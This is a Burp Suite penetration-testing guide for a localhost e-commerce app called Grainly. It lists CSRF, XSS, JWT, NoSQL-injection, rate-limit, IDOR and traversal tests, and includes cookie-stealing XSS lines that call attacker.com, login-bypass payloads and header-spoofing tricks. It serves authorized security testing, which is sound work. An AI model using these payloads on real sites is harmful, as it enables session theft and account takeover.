# 🔍 Burp Suite Penetration Testing Guide for Grainly

> *Comprehensive security testing using Burp Suite to identify and exploit vulnerabilities in the Grainly e-commerce platform*

---

## 🎯 **Overview: Burp Suite Testing Strategy**

This guide provides a systematic approach to penetration testing the Grainly application using Burp Suite Professional. We'll test for the identified vulnerabilities and discover potential new ones through comprehensive security assessment.

### **Target Application**
- **URL**: `http://localhost:5000` (Backend API)
- **Frontend**: `http://localhost:5173` (React App)
- **Technology Stack**: Node.js, Express, MongoDB, JWT

---

## 🛠️ **Burp Suite Setup & Configuration**

### **1. Proxy Configuration**
```
Burp Suite → Proxy → Options → Proxy Listeners
- Add: 127.0.0.1:8080
- Interface: 127.0.0.1
- Port: 8080
- Bind to port: ✓
```

### **2. Browser Configuration**
```
Firefox/Chrome → Settings → Network → Proxy
- HTTP Proxy: 127.0.0.1
- Port: 8080
- Use proxy for all protocols: ✓
```

### **3. SSL Certificate Installation**
```
Burp Suite → Proxy → Options → Import/Export CA Certificate
- Export certificate
- Install in browser trust store
```

---

## 🚨 **Critical Vulnerability Testing**

### **1. CSRF (Cross-Site Request Forgery) Testing**

#### **A. Identify State-Changing Endpoints**
```http
POST /api/auth/register
POST /api/auth/login
POST /api/users/profile
PUT /api/users/profile
POST /api/bookings
POST /api/contact
POST /api/auth/forgot-password
POST /api/auth/reset-password
```

#### **B. CSRF Attack Methodology**
1. **Intercept Request**: Capture state-changing requests
2. **Remove CSRF Tokens**: Check if endpoints accept requests without CSRF tokens
3. **Create Malicious HTML**: 
```html
<form action="http://localhost:5000/api/users/profile" method="POST">
  <input type="hidden" name="name" value="Hacked">
  <input type="hidden" name="email" value="hacker@evil.com">
  <input type="submit" value="Click to win!">
</form>
```

#### **C. Burp Suite Steps**
```
1. Proxy → Intercept → ON
2. Send request to Repeater
3. Remove Authorization header
4. Send request without authentication
5. Check if 401 response (expected) or 200 (vulnerable)
```

### **2. XSS (Cross-Site Scripting) Testing**

#### **A. Reflected XSS Payloads**
```javascript
// Basic XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// Advanced XSS
<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
<script>new Image().src="http://attacker.com?cookie="+document.cookie;</script>
```

#### **B. Stored XSS Testing**
```
Target: /api/contact
Payload: {
  "name": "<script>alert('XSS')</script>",
  "email": "xss@test.com",
  "message": "<img src=x onerror=alert('XSS')>"
}
```

#### **C. Burp Suite Methodology**
```
1. Intruder → Positions → Clear
2. Add payload positions: §name§, §email§, §message§
3. Payloads → Add XSS payloads
4. Start attack
5. Check responses for reflected XSS
```

### **3. Authentication Bypass Testing**

#### **A. JWT Token Manipulation**
```http
GET /api/users/profile
Authorization: Bearer <manipulated_token>
```

#### **B. Token Analysis in Burp Suite**
```
1. Decoder → Paste JWT token
2. Decode Base64
3. Modify payload (change user ID, admin status)
4. Re-encode and test
```

#### **C. Common JWT Attacks**
```javascript
// 1. Algorithm Confusion
// Change "alg": "HS256" to "alg": "none"

// 2. Weak Secret
// Try common secrets: "secret", "admin", "password"

// 3. Token Expiry Bypass
// Modify "exp" timestamp to future date
```

### **4. SQL/NoSQL Injection Testing**

#### **A. MongoDB Injection Payloads**
```json
// Login Bypass
{
  "email": {"$ne": null},
  "password": "anything"
}

// User Enumeration
{
  "email": {"$regex": ".*"},
  "password": "anything"
}

// Boolean Injection
{
  "email": "admin@test.com",
  "password": {"$gt": ""}
}
```

#### **B. Burp Suite Testing**
```
1. Intruder → Positions
2. Mark email and password fields
3. Payloads → Add injection payloads
4. Start attack
5. Check for successful login with invalid credentials
```

### **5. Rate Limiting Bypass**

#### **A. Bypass Techniques**
```http
# 1. Change IP Headers
X-Forwarded-For: 192.168.1.1
X-Real-IP: 192.168.1.1
X-Originating-IP: 192.168.1.1

# 2. Multiple IP Rotation
X-Forwarded-For: 192.168.1.1, 192.168.1.2, 192.168.1.3

# 3. Null Byte Injection
X-Forwarded-For: 192.168.1.1%00
```

#### **B. Burp Suite Automation**
```
1. Intruder → Positions
2. Mark X-Forwarded-For header
3. Payloads → Add IP addresses
4. Start attack
5. Check if rate limiting is bypassed
```

---

## 🔍 **Advanced Burp Suite Testing**

### **1. Intruder Module Testing**

#### **A. Brute Force Login**
```
Target: POST /api/auth/login
Positions: §email§, §password§
Payloads:
- Email: admin@test.com, test@test.com, user@test.com
- Password: admin, password, 123456, admin123
```

#### **B. User Enumeration**
```
Target: POST /api/auth/login
Positions: §email§
Payloads: 
- admin@test.com
- user@test.com
- test@test.com
- Check different error messages
```

### **2. Repeater Module Testing**

#### **A. Authorization Testing**
```http
# Test admin endpoints without admin token
GET /api/users
GET /api/bookings/admin
POST /api/pulses

# Test user endpoints with different user tokens
GET /api/users/profile
GET /api/bookings
```

#### **B. Parameter Manipulation**
```http
# Test IDOR vulnerabilities
GET /api/users/profile?id=1
GET /api/users/profile?id=2
GET /api/bookings?id=1
GET /api/bookings?id=2
```

### **3. Scanner Module Testing**

#### **A. Active Scanning**
```
1. Target → Add scope: http://localhost:5000
2. Scanner → Scan → Active Scan
3. Configure scan settings
4. Start scan and monitor results
```

#### **B. Passive Scanning**
```
1. Browse application normally
2. Scanner → Passive Scan → ON
3. Monitor for vulnerabilities in background
```

---

## 🚨 **Specific Vulnerability Tests**

### **1. Information Disclosure**

#### **A. Error Message Analysis**
```http
# Test for verbose error messages
GET /api/nonexistent
POST /api/auth/login
{
  "email": "invalid",
  "password": "invalid"
}
```

#### **B. Directory Traversal**
```http
GET /api/../.env
GET /api/../../config/db.js
GET /api/../../../package.json
```

### **2. Business Logic Testing**

#### **A. Price Manipulation**
```json
POST /api/bookings
{
  "items": [
    {
      "id": "product_id",
      "quantity": 1,
      "price": 0.01  // Try to manipulate price
    }
  ]
}
```

#### **B. Quantity Bypass**
```json
POST /api/bookings
{
  "items": [
    {
      "id": "product_id",
      "quantity": -1,  // Negative quantity
      "price": 10.00
    }
  ]
}
```

### **3. Session Management Testing**

#### **A. Session Fixation**
```
1. Login with valid credentials
2. Capture session token
3. Logout
4. Try to reuse old token
5. Check if token is invalidated
```

#### **B. Concurrent Session Testing**
```
1. Login with same account on multiple browsers
2. Check if old sessions are invalidated
3. Test session timeout
```

---

## 📊 **Burp Suite Reporting**

### **1. Issue Tracking**
```
Burp Suite → Issues → Add Issue
- Issue Type: CSRF, XSS, Auth Bypass, etc.
- Severity: High, Medium, Low
- Description: Detailed vulnerability description
- Remediation: Fix recommendations
```

### **2. Export Findings**
```
Burp Suite → Reports → Generate Report
- Include: All findings, evidence, screenshots
- Format: HTML, PDF, XML
- Scope: All discovered vulnerabilities
```

---

## 🛡️ **Remediation Verification**

### **1. CSRF Protection Verification**
```http
# Check if CSRF tokens are required
POST /api/users/profile
Content-Type: application/json
X-CSRF-Token: <token>

# Without CSRF token should return 403
```

### **2. XSS Protection Verification**
```http
# Test XSS payloads
POST /api/contact
{
  "name": "<script>alert('XSS')</script>",
  "email": "test@test.com",
  "message": "Test"
}

# Check if payload is sanitized in response
```

### **3. Rate Limiting Verification**
```http
# Test rate limiting
POST /api/auth/login
# Send multiple requests quickly
# Should get rate limit error after 5 attempts
```

---

## 📋 **Testing Checklist**

### **✅ Pre-Testing Setup**
- [ ] Burp Suite configured with proxy
- [ ] SSL certificate installed
- [ ] Target application running
- [ ] Test accounts created
- [ ] Scope defined

### **✅ Authentication Testing**
- [ ] JWT token manipulation
- [ ] Authentication bypass attempts
- [ ] Session management testing
- [ ] Multi-factor authentication testing
- [ ] Password reset functionality

### **✅ Authorization Testing**
- [ ] Role-based access control
- [ ] Privilege escalation attempts
- [ ] Admin endpoint access
- [ ] User data isolation

### **✅ Input Validation Testing**
- [ ] XSS payload testing
- [ ] SQL/NoSQL injection testing
- [ ] File upload testing
- [ ] Parameter manipulation

### **✅ Business Logic Testing**
- [ ] Price manipulation
- [ ] Quantity bypass
- [ ] Order manipulation
- [ ] Payment bypass

### **✅ Security Headers Testing**
- [ ] CORS configuration
- [ ] Content Security Policy
- [ ] X-Frame-Options
- [ ] X-Content-Type-Options

---

## 🎯 **Expected Findings Summary**

### **High Priority Vulnerabilities**
1. **CSRF Protection Missing** - State-changing endpoints vulnerable
2. **HTTPS Not Enforced** - All traffic in plaintext
3. **Advanced XSS Protection** - Limited input sanitization

### **Medium Priority Vulnerabilities**
1. **Session Management** - No session invalidation on password change
2. **Rate Limiting Bypass** - Potential IP header manipulation
3. **Information Disclosure** - Verbose error messages

### **Low Priority Vulnerabilities**
1. **Security Headers** - Missing security headers
2. **Logging** - Limited security event logging
3. **Monitoring** - No automated security monitoring

---

## 🚀 **Next Steps**

1. **Run Complete Burp Suite Scan**
2. **Document All Findings**
3. **Prioritize Vulnerabilities**
4. **Implement Fixes**
5. **Re-test After Fixes**
6. **Generate Final Report**

---

> **Remember**: Always test in a controlled environment and never test against production systems without proper authorization.

*This guide provides a comprehensive framework for testing the Grainly application's security posture using Burp Suite Professional.* 